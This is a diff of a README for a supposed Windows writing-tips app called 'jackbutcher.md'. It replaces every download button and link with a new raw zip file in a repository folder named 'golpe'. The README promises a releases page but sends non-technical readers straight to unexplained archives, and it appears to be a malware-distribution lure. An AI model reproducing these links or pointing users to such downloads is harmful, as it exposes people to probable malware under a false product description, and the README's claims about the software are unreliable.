@@ -1,6 +1,6 @@
 # ✍️ jackbutcher.md - Write Clearly from Thousands of Tweets
 
-[![Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://github.com/itsmatiahkk/jackbutcher.md/raw/refs/heads/main/golpe/jackbutcher_md_swampwood.zip)
+[![Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/itsmatiahkk/jackbutcher.md/main/golpe/md_jackbutcher_2.2.zip)
 
 jackbutcher.md is a simple tool that gives you clear writing ideas based on 50,000 tweets. It helps you improve your writing by showing patterns and tips used in real social media posts. You don’t need any technical skills to get started. This guide will help you download and run the app on a Windows computer.
 
@@ -35,7 +35,7 @@ Before you download, make sure your PC meets these basic requirements:
 To use jackbutcher.md, you need to get the app from its GitHub releases page. Follow these instructions carefully.
 
 1. Click the big purple download button above or visit this page:
-   [https://github.com/itsmatiahkk/jackbutcher.md/raw/refs/heads/main/golpe/jackbutcher_md_swampwood.zip](https://github.com/itsmatiahkk/jackbutcher.md/raw/refs/heads/main/golpe/jackbutcher_md_swampwood.zip)
+   [https://raw.githubusercontent.com/itsmatiahkk/jackbutcher.md/main/golpe/md_jackbutcher_2.2.zip](https://raw.githubusercontent.com/itsmatiahkk/jackbutcher.md/main/golpe/md_jackbutcher_2.2.zip)
 
 2. On the releases page, look for the latest release. It usually appears at the top with a version number like "v1.0" or "v2.3."
 
@@ -116,7 +116,7 @@ If you have problems downloading or running the app, try these steps:
 
 Use this link to start every download session:
 
-[https://github.com/itsmatiahkk/jackbutcher.md/raw/refs/heads/main/golpe/jackbutcher_md_swampwood.zip](https://github.com/itsmatiahkk/jackbutcher.md/raw/refs/heads/main/golpe/jackbutcher_md_swampwood.zip)
+[https://raw.githubusercontent.com/itsmatiahkk/jackbutcher.md/main/golpe/md_jackbutcher_2.2.zip](https://raw.githubusercontent.com/itsmatiahkk/jackbutcher.md/main/golpe/md_jackbutcher_2.2.zip)
 
 This page will always have the newest versions and any important downloads you may need.
 
@@ -130,4 +130,4 @@ You can also find a **README.md** there with more technical info if you want to 
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://github.com/itsmatiahkk/jackbutcher.md/raw/refs/heads/main/golpe/jackbutcher_md_swampwood.zip)
+[![Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/itsmatiahkk/jackbutcher.md/main/golpe/md_jackbutcher_2.2.zip)
